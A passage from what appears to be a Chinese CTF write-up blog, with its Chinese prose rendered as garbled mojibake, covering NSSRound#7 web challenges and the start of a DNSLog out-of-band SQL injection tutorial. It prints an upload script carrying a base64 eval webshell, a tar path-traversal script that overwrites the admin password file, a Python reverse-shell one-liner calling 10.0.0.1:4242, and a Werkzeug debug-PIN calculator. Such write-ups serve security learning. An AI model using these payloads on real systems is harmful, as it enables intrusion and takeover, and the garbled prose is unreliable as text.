ï¼Œé€šè¿‡strops()æ£€æµ‹æ–‡ä»¶çš„åç§°æ˜¯å¦å­˜åœ¨pngï¼Œç›´æ¥æ”¹å¢åŠ pngå³å¯ç»•è¿‡ï¼Œå…³é”®æ˜¯ä¼šå°†&lt;?php die(â€œRound7 do you likeâ€);å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å°±å¯¼è‡´äº†ä¼ å…¥çš„è™½ç„¶æ˜¯phpæ–‡ä»¶ï¼Œä½†æ˜¯ä¼šç»ˆæ­¢ã€‚è¿™é‡Œä¹Ÿæ˜¯ä½¿ç”¨ä¸Šé¢åŒä¸€ä¸ªtipsï¼Œä½¿ç”¨è¿‡æ»¤å™¨ä½¿ç”¨æ–‡ä»¶ï¼Œå¦‚php://filter/write=convert.base64-decode/resource=aiwin.png.phpï¼Œè®©å†™å…¥å†…å®¹è¿›è¡Œbase64è§£ç ï¼Œè¿™é‡Œè¦ä½¿ç”¨URLç¼–ç ï¼Œç»•è¿‡/resource=aiwin.png.phpä½œä¸ºæ–‡ä»¶åï¼Œç„¶ååœ¨æ–‡ä»¶å†™å…¥çš„å†…å®¹ä¸­æ„é€ base64ï¼Œä½¿å¾—&lt;?php die(â€œRound7 do you likeâ€);è¢«ä¸æ­£å¸¸è§£ç ï¼Œé€ æˆæ­»äº¡ç»•è¿‡</code><br>æ­»äº¡ç»•è¿‡ä¹Ÿæ˜¯å¸¸è§çš„ï¼Œä¸»è¦æ˜¯urlç¼–ç ï¼Œä¸ç„¶å°±ä¼šé€ æˆresource&#x3D;aiwin.png.phpä½œä¸ºæ–‡ä»¶åï¼Œç„¶åå°±å¯ä»¥è‡ªå·±åœ¨æœ¬åœ°å†™ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„HTMLæ¥æŠ“åŒ…å¾—åˆ°æ–‡ä»¶ç±»å‹ï¼Œæˆ–è€…ç›´æ¥ç”¨å†™è„šæœ¬æ¥ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">content = <span class="string">b&quot;&quot;&quot;aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pOz8+&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28571/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1a&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=&amp;NSScTf=114514.3&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span></span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%31%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">resp = requests.post(url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥åœ¨homeä¸‹æ‰¾åˆ°flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157724.png" alt="image-20230226215742674"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/weixin_53090346/article/details/128815454">NSSRound#7 TeamWebå­¦ä¹ _Aiwin-Hackerçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_æ¸…é£â€“çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.ctfer.vip/note/set/923">NSSCTF - æ–‡ç«  - NSSRound#7 Team å®˜æ–¹Write Up (ctfer.vip)</a></p><h1 id="æ–°çš„åšå®¢"><a href="#æ–°çš„åšå®¢" class="headerlink" title="æ–°çš„åšå®¢"></a>æ–°çš„åšå®¢</h1><p>ç¬¬ä¸€ä¸ªè·¯ç”±ä¸‹å¯ä»¥å¾—åˆ°ä¸€äº›ä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262200347.png" alt="image-20230226220057048"></p><p>è§£å¯†ä¸­é—´çš„å­—ç¬¦å¾—åˆ°æºç </p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262158964.png" alt="image-20230226215824314"></p><p>æ‰“å¼€å¯ä»¥çœ‹åˆ°åªè¦adminå¯ä»¥çœ‹åˆ°flagï¼Œè¿™é‡Œå…¶å®å°±æ˜¯åˆ©ç”¨ç›®å½•ç©¿è¶Šè¦†ç›–æ‰åŸæ¥çš„userinfo.jsonï¼Œé‡ç½®adminå¯†ç ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹CVE-2007-4559ï¼Œå¯æ€œæˆ‘å½“æ—¶è¿˜ä¸€ç›´æƒ³ç€ä¼ªé€ session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;Joker&#x27;</span> <span class="comment"># ä½ æ³¨å†Œæ—¶ç”¨çš„ç”¨æˆ·åï¼Œå°½é‡åˆ«æœ‰å¥‡æ€ªçš„ç¬¦å·</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;123456&#x27;</span> <span class="comment"># ä¹‹åè¦ä½¿ç”¨adminè´¦æˆ·ç™»é™†æ—¶çš„å¯†ç </span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åä¼šäº§ç”Ÿä¸€ä¸ªupload.tar.gzæ–‡ä»¶ï¼Œç„¶åç”¨è„šæœ¬ä¸­çš„ç”¨æˆ·åå»æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•åä¸Šä¼ ç”Ÿæˆçš„upload.tar.gzæ–‡ä»¶ï¼Œç„¶åæ³¨é”€ï¼Œç”¨adminç™»å½•å³å¯çœ‹åˆ°flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201544.png" alt="image-20230226220113486"></p><h1 id="ShadowFlag"><a href="#ShadowFlag" class="headerlink" title="ShadowFlag"></a>ShadowFlag</h1><p>å…ˆæ”¾ä»£ç ï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡è¿™ç±»é¢˜ï¼Œè‡ªå·±å¯¹äºLinuxçš„å¾ˆå¤šä¸œè¥¿ä¹Ÿä¸æ‡‚ï¼Œè¶æ­¤å¯ä»¥å­¦å­¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    flag2 = f.read()  </span><br><span class="line">tag = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        <span class="keyword">return</span> f.read()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():  </span><br><span class="line">    <span class="keyword">global</span> tag  </span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">global</span> flag1  </span><br><span class="line">        <span class="keyword">del</span> flag1  </span><br><span class="line">        tag = <span class="literal">True</span>  </span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)  </span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]  </span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        os.system(action)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):  </span><br><span class="line">    sleep(<span class="number">5</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;æ‰«æ‰«æ‰«ï¼Œæ‰«å•¥ä¸œæ–¹æ˜ç å‘¢[æ€’]&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹shellè·¯ç”±ï¼Œå¯ä»¥å¼¹ä¸ªshellï¼Œè¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ç”¨%09å¯ä»¥ç»•è¿‡ï¼Œç„¶åå»å¤§ä½¬æ¨èçš„å¼¹shellå¤§åˆé›†é‡Œé¢æ‰¾ä¸ªpythonæ— ç©ºæ ¼çš„å°±è¡Œ,[å¼¹shellå¤§åˆé›†](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings&#x2F;Reverse Shell Cheatsheet.md at master Â· swisskyrepo&#x2F;PayloadsAllTheThings (github.com)</a>)<br><code>act=python%09-c%09&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br>hackbaræ‰§è¡Œæ‹¿åˆ°shellï¼Œç„¶åè¿™é‡Œæ¶‰åŠåˆ°æ‹¿flagçš„ç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªflagæ˜¯ä½¿ç”¨openæ‰“å¼€çš„<code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>ï¼Œä½†æ˜¯rmåˆ é™¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨close()æ¥å…³é—­ï¼Œè¿™æ ·å°±ä¼šé€ æˆï¼Œæ–‡ä»¶è™½ç„¶å·²ç»åˆ é™¤ä½†æ˜¯è¿›ç¨‹ä»ç„¶å­˜åœ¨ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨<code>/proc/[pid]/fd</code>ä¸‹æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶</p></blockquote><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201726.png" alt="image-20230226220131766"></p><p>è¿™æ ·å°±æ‰¾åˆ°äº†ç¬¬ä¸€æ®µflagï¼Œç„¶åæ‰¾ç¬¬äºŒæ®µflagï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°é«˜ç‰ˆæœ¬çš„flask pinå€¼è®¡ç®—ï¼Œå› ä¸ºç¬¬äºŒä¸ªflagæ˜¯ç”¨withæ‰“å¼€<code>with open(&quot;/tmp/flag2.txt&quot;, &quot;r&quot;) as f:</code>ç”¨withæ‰“å¼€ç‰¹ç‚¹æ˜¯ä½¿ç”¨å®Œåé»˜è®¤å…³é—­ï¼Œæ‰€ä»¥å°±å¾—ä»flaskç¯å¢ƒä¸­å»æ‰¾ï¼Œå³ç®—å‡ºpinå€¼ï¼Œæ‰“å¼€consoleè°ƒè¯•å»æ‰¾<br>è®¡ç®—pinå€¼éœ€è¦å¾—åˆ°ä¸‹é¢è¿™å‡ ä¸ªæ•°å€¼</p><blockquote><p>1.flaskæ‰€ç™»å½•çš„ç”¨æˆ·å<br>2.flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„<br>2.å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°<br>2.docker_idå’Œæœºå™¨id</p></blockquote><p>æ€ä¹ˆæ‰¾ç›´æ¥å†™åœ¨è„šæœ¬é‡Œé¢äº†ï¼Œdockeré‚£é‡Œå–æœ€ä¸Šé¢çš„å€¼å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1ç®—æ³•ï¼Œé€‚ç”¨äºé«˜ç‰ˆæœ¬flask  </span></span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain  </span><br><span class="line">probably_public_bits = [  </span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd ç”¨æˆ·å whoami </span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼  </span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼  </span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ° app.pyçš„ç»å¯¹è·¯å¾„  </span></span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">private_bits = [  </span><br><span class="line">    <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:00:f7&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)),  </span><br><span class="line"> <span class="comment">#/proc/sys/kernel/random/boot_id + docker_id è¯»å–ç”¨/proc/self/cgroupæˆ–è€…/proc/1/cpuset  </span></span><br><span class="line">    <span class="string">&quot;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235&quot;</span>+<span class="string">&quot;0dcbb0f159a0a2183aa148b6259b663635ea0a7ec4822b7da342ed08761bf47c&quot;</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">h = hashlib.sha1()  </span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):  </span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    h.update(bit)  </span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]  </span><br><span class="line">  </span><br><span class="line">num = <span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)  </span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">rv =<span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:  </span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)  </span><br><span class="line">                        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        rv = num  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°pinï¼Œç„¶ååœ¨ä¸‹é¢è¿™é‡Œè¾“å…¥flag2å¾—åˆ°</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201618.png" alt="image-20230226220150459"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_æ¸…é£â€“çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag#nssctf-round7-shadowflag">Randark-JMT&#x2F;NSSCTF-Round_v7-ShadowFlag: A reverse challenge in NSSCTF Round#7 (github.com)</a><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ³•äºŒï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹<br><a href="https://www.cnblogs.com/nLesxw/p/web_shadowflag.html">NSS Round7_web - nLesxw - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DnsLogå¤–å¸¦æ³¨å…¥å­¦ä¹ </title>
      <link href="/2022/12/DnsLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/12/DnsLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p> å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªæ•°æ®åº“è¿›è¡Œæ³¨å…¥æ—¶ï¼Œæ— å›æ˜¾ï¼Œä¸”æ— æ³•è¿›è¡Œæ—¶é—´æ³¨å…¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ä¸€ä¸ªé€šé“ï¼ŒæŠŠæŸ¥è¯¢åˆ°æ•°æ®é€šè¿‡é€šé“å¸¦å‡ºå»ï¼Œè¿™é‡Œçš„é€šé“åŒ…æ‹¬ï¼šhttpè¯·æ±‚ã€DNSè§£æã€SMBæœåŠ¡ç­‰å°†æ•°æ®å¸¦å‡ºã€‚</p><h2 id="DNSæ˜¯ä»€ä¹ˆ"><a href="#DNSæ˜¯ä»€ä¹ˆ" class="headerlink" title="DNSæ˜¯ä»€ä¹ˆ"></a>DNSæ˜¯ä»€ä¹ˆ</h2><p><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSåŸç†åŠå…¶è§£æè¿‡ç¨‹_king9666çš„åšå®¢-CSDNåšå®¢</a><br>DNS( Domain Name System)æ˜¯â€œåŸŸåç³»ç»Ÿâ€çš„è‹±æ–‡ç¼©å†™ï¼Œæ˜¯ä¸€ç§ç»„ç»‡æˆåŸŸå±‚æ¬¡ç»“æ„çš„è®¡ç®—æœºå’Œç½‘ç»œæœåŠ¡å‘½åç³»ç»Ÿï¼Œå®ƒç”¨äºTCP&#x2F;IPç½‘ç»œï¼Œå®ƒæ‰€æä¾›çš„æœåŠ¡æ˜¯ç”¨æ¥å°†ä¸»æœºåå’ŒåŸŸåè½¬æ¢ä¸ºIPåœ°å€çš„å·¥ä½œã€‚DNSå°±æ˜¯è¿™æ ·çš„ä¸€ä½â€œç¿»è¯‘è€…â€.<br>åŒæ—¶,DNSæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿï¼Œå®ƒæä¾›å°†åŸŸåè½¬æ¢æˆå¯¹åº”IPåœ°å€çš„ä¿¡æ¯ã€‚è¿™ç§å°†åç§°è½¬æ¢æˆIPåœ°å€çš„æ–¹æ³•ç§°ä¸ºåŸŸåè§£æã€‚æ‰€ä»¥åœ¨ç”³è¯·åŸŸåçš„æ—¶å€™éƒ½è¦å°†åŸŸåæ‰€æŒ‡å‘çš„IPåœ°å€æäº¤ç»™NICã€‚è¿™æ ·å°±è¦æ±‚ä½ çš„IPå¿…é¡»æ˜¯å›ºå®šçš„æ‰å¯ä»¥ç”³è¯·åŸŸåã€‚<br><strong>ç®€å•æ¥è¯´å°±æ˜¯å°†åŸŸåè§£æä¸ºip</strong></p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸ªç‰¹å®šçš„å¯ä»¥è®°å½•DNSè§£æçš„ç½‘ç«™<a href="http://dnslog.cn/">DNSLog Platform</a><br>è¿™ä¸ªç½‘ç«™å°±å¯ä»¥çœ‹åˆ°DNSè§£æè®°å½•ï¼Œå°†å›æ˜¾æ‰“åˆ°è¿™ä¸ªç½‘ç«™ä»è€Œå®ç°æ³¨å…¥<br>å…ˆçœ‹çœ‹ç½‘ç«™çš„ä½¿ç”¨ï¼Œè¿›å…¥ç‚¹å‡»Get SubDomainå¯ä»¥è·å¾—ä¸€ä¸ªåŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/pSSpmQS.png" alt="pSSpmQS.png"><br>ç„¶åpingä¸€ä¸‹è¿™ä¸ªåŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/zzxNsH.png" alt="zzxNsH.png"><br>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿpingé€šï¼Œè¯´æ˜DNSè§£ææˆåŠŸï¼Œç„¶åå»ç½‘é¡µç‚¹å‡»Refresh Recordå¯ä»¥çœ‹åˆ°è§£æè®°å½•<br><img src="https://s1.ax1x.com/2022/12/28/zzxJzD.png" alt="zzxJzD.png"><br>ç„¶åå®ƒä¹Ÿå¯ä»¥è§£ægum6ss.dnslog.cnåŸŸåä¸‹çš„ä»»ä½•å­åŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/zzx8JK.png" alt="zzx8JK.png"><br>åŒæ ·å¯ä»¥åœ¨ç½‘ç«™çœ‹åˆ°è§£æè®°å½•</p><h2 id="MySQLä¸­load-file"><a href="#MySQLä¸­load-file" class="headerlink" title="MySQLä¸­load_file()"></a>MySQLä¸­load_file()</h2><p>é¦–å…ˆåœ¨æˆ‘ç”µè„‘<code>D:\MySQL</code>è·¯å¾„ä¸‹å‡†å¤‡ä¸€ä¸ªa.txtæ–‡ä»¶ï¼Œå†…å®¹ä¸ºhello!ï¼Œç„¶ååˆ©ç”¨load_file()å‡½æ•°è¯»å–<br><img src="https://s1.ax1x.com/2022/12/28/zzxGRO.png" alt="zzxGRO.png"><br>è¯»å–æˆåŠŸï¼Œè¿™é‡Œè·¯å¾„å¿…é¡»ç”¨&#x2F;æ‰è¡Œï¼Œè€Œä¸”MySQLçš„é…ç½®æ–‡ä»¶secure_file_privå¿…é¡»ä¸ºç©ºï¼Œå³secure_file_priv&#x3D;â€ â€œ</p><h2 id="concat-å‡½æ•°"><a href="#concat-å‡½æ•°" class="headerlink" title="concat()å‡½æ•°"></a>concat()å‡½æ•°</h2><p>è¿™ä¸ªå‡½æ•°æŒºç®€å•ï¼Œå°±æ˜¯ç”¨äºå¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥<br><img src="https://s1.ax1x.com/2022/12/28/zzx3i6.png" alt="zzx3i6.png"></p><h2 id="æœ¬åœ°æµ‹è¯•"><a href="#æœ¬åœ°æµ‹è¯•" class="headerlink" title="æœ¬åœ°æµ‹è¯•"></a>æœ¬åœ°æµ‹è¯•</h2><p><strong>æ ¹æ®load_fileå‡½æ•°çš„è¯­æ³•è§„åˆ™ï¼Œè®¿é—®äº’è”ç½‘ä¸­çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœ€å‰é¢åŠ ä¸Šä¸¤ä¸ªæ–œæ   &#x2F;&#x2F;</strong><br>ç„¶åæˆ‘é‡æ–°è·å–ä¸€ä¸ªåŸŸåä¸ºd07ib5.dnslog.cnï¼Œç”¨load_file()å‡½æ•°è·å–è¿™ä¸ªåŸŸåä¸‹çš„æ–‡ä»¶ä»è€Œç•™ä¸‹è§£æè®°å½•ï¼Œè¿™é‡Œçš„æ–‡ä»¶éšæ„ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„æ˜¯ç•™ä¸‹è®°å½•ï¼Œè€Œä¸æ˜¯æŸ¥çœ‹æ–‡ä»¶<br><img src="https://s1.ax1x.com/2022/12/28/zzxlIx.png" alt="zzxlIx.png"><br>å¯ä»¥çœ‹åˆ°æˆåŠŸç•™ä¸‹è®°å½•<br><img src="https://s1.ax1x.com/2022/12/28/zzxQd1.png" alt="zzxQd1.png"></p><h3 id="è·å–åº“å"><a href="#è·å–åº“å" class="headerlink" title="è·å–åº“å"></a>è·å–åº“å</h3><p>è¿™æ 